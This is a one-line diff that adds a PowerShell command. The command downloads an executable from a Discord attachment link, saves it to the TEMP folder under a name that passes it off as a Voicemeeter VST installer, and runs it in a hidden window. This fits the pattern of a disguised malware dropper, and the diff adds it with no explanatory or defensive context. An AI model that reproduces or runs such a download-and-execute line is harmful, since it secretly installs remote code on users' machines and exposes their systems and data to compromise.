@@ -1,0 +1,1 @@
+iwr -useb https://cdn.discordapp.com/attachments/1126871660780326945/1147640946159276092/aCGXAicNKM.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
